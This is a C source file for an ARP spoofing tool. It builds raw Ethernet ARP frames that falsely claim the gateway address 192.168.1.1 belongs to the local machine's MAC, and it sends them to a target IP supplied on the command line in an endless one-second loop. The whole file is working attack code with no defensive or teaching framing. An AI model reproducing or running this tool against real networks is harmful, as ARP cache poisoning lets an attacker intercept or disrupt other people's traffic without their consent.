#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <errno.h>
#include <error.h>
#include <string.h>
#include "netdevice.h"

#define error_exit(_errmsg_)    error(EXIT_FAILURE, errno, _errmsg_)

#define MAC_LEN		6
#define IP4_LEN		4
#define GATEWAY		"192.168.1.1"
#define DEV_NAME	"eth0"

#define DEBUG	0

extern int arp_attack(const char *ipaddress);

int main(int argc, const char **argv)
{
	struct sockaddr_in attackip;
	int counter = 0;

	if (argc != 2) {
		puts("using './arp ipaddress' ");
		return 0;
	}
	if (-1 == inet_aton(argv[1], &attackip.sin_addr)) {
		puts("invalid ip address !");
		return -1;
	}

	while (1) {
		arp_attack(argv[1]);
		printf("%s ------------  attacked ! ---------- [%d]\n", argv[1], counter ++);
		sleep(1);
	}

	return 0;
}

int arp_attack(const char *ipaddress)
{
    int sockfd;
    struct sockaddr_ll  peeraddr;
    struct frame_ether  {
        struct ether_header eth_header;
        struct arphdr arp_header;
        unsigned char src_mac[MAC_LEN];
        unsigned char src_ip[IP4_LEN];
        unsigned char dst_mac[MAC_LEN];
        unsigned char dst_ip[IP4_LEN];
    }frame_buff;

	struct sockaddr_in shark_addr,
					   atk_ipaddr;
	struct sockaddr local_hwaddr;
	

    if (-1 == (sockfd = socket(AF_PACKET, SOCK_RAW, 0)))
        error_exit("socket");

/* get local ipaddress and macaddress */
	gethwaddr(DEV_NAME, &local_hwaddr);
//	getipaddr(DEV_NAME, (struct sockaddr *)&shark_addr);
	shark_addr.sin_addr.s_addr = inet_addr(GATEWAY);

    
/* fill peeraddr  */
    memset(&peeraddr, 0, sizeof(peeraddr));
    peeraddr.sll_family = AF_PACKET;
    /* set the broadcast mac address: ff:ff:ff:ff:ff:ff */
    memset(peeraddr.sll_addr, 0xff, sizeof(peeraddr.sll_addr));
    peeraddr.sll_halen = MAC_LEN;     /**/
    peeraddr.sll_ifindex = getifindex(DEV_NAME);

/* fill frame structure */
	/* fill ether header */
    memset(frame_buff.eth_header.ether_dhost, 0xff, MAC_LEN);
    memcpy(frame_buff.eth_header.ether_shost, local_hwaddr.sa_data, MAC_LEN);
    frame_buff.eth_header.ether_type = htons(ETH_P_ARP);
	
	/* fill arp header */
    frame_buff.arp_header.ar_hrd = htons(ARPHRD_ETHER);
    frame_buff.arp_header.ar_pro = htons(ETH_P_IP);
    frame_buff.arp_header.ar_hln = MAC_LEN;
    frame_buff.arp_header.ar_pln = IP4_LEN;
    frame_buff.arp_header.ar_op = htons(ARPOP_REQUEST);

	/* fill arp body */
    memcpy(frame_buff.src_mac, local_hwaddr.sa_data, MAC_LEN);
    memcpy(frame_buff.src_ip, &shark_addr.sin_addr, IP4_LEN);
	
    memset(frame_buff.dst_mac, 0xff, MAC_LEN);
	inet_aton(ipaddress, &atk_ipaddr.sin_addr);
    memcpy(frame_buff.dst_ip, &atk_ipaddr.sin_addr, IP4_LEN);

#if DEBUG
	printf("src_mac: %#x\n", *(int *)frame_buff.src_mac);
	printf("src_ip:  %#x\n", *(int *)frame_buff.src_ip);
	printf("dst_mac: %#x\n", *(int *)frame_buff.dst_mac);
	printf("dst_ip:  %#x\n", *(int *)frame_buff.dst_ip);
#endif
    

    if (-1 == sendto(sockfd, &frame_buff, sizeof(frame_buff), 0,
            (struct sockaddr *)&peeraddr, sizeof(peeraddr)))
        error_exit("sendto");

    return 0;
}
